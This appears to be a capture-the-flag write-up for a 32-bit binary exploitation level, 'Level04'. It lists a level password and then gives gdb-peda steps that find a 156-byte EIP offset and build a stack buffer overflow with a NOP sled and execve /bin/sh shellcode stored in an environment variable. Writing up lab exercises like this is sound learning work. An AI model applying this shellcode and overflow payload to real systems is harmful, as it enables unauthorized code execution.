# Level04 - 32 bits -

## Local script usage

Requirements:

- `gdb-peda`
- `getenv32`

You can setup requirements with the script: [scripts/installUtils.sh](../../scripts/installUtils.sh)

```shell
./scripts/installUtils.sh
./level04/Ressources/main.sh
```

## Passwords and token

|         |                                            |
| ------- | ------------------------------------------ |
| level04 | `kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf` |
| level05 | ``                                         |

## Steps to resolve on VM

See our assembly interpretation in [source file](../source.c)

```shell
pattern create 200 input
run < <(cat /tmp/input)
  Invalid $PC address: 0x71414154
  Stopped reason: SIGSEGV
  0x71414154 in ?? ()

pattern search
  EIP+0 found at offset: 156

python -c 'print "A" * 156 + "BBBB"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

0xffffd450 --> 0xffffd470 ('A' <repeats 156 times>, "BBBB")
x/x $esp+0x20
0xffffd470:     0x41414141

SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * (156-100-23) + "\x70\xd4\xff\xff"'
> Stopped reason: SIGHUP # or SIGILL
0x08048823 in main ()
# SIGHUP before return


export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`

./getenv32 SHELLCODE ~/level04
0xffffd755
python -c 'print "A" * 156 + "\x55\xd7\xff\xff"' > /tmp/exploit04

p /x 0xffffd755 + 100
$2 = 0xffffd7b9

python -c 'print "A" * 156 + "\xb9\xd7\xff\xff"' > /tmp/exploit04
```

> PTRACE_TRACEME (http://manpagesfr.free.fr/man/man2/ptrace.2.html)

    Le processus en cours va être suivi par son père. Tout signal (sauf SIGKILL) reçu par le processus l'arrêtera, et le père sera notifié grâce à wait(2). De plus, les appels ultérieurs à execve(2) par ce processus lui enverront SIGTRAP, ce qui donne au père la possibilité de reprendre le contrôle avant que le nouveau programme continue son exécution. Un processus ne doit pas envoyer cette requête si son père n'est pas prêt à le suivre. Dans cette requête, pid, addr et data sont ignorés.

## Sources

### ASM

- [What does the “rep stos” x86 assembly instruction sequence do?](https://stackoverflow.com/questions/3818856/what-does-the-rep-stos-x86-assembly-instruction-sequence-do)

### C

- [Man fork](https://linux.die.net/man/3/fork)
- [Man gets](https://linux.die.net/man/3/gets)
- [Man kill](https://linux.die.net/man/3/kill)
- [Man memset](https://linux.die.net/man/3/memset)
- [Man prctl](https://linux.die.net/man/2/prctl)
- [Man ptrace](https://linux.die.net/man/2/ptrace)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man wait](https://linux.die.net/man/2/wait)
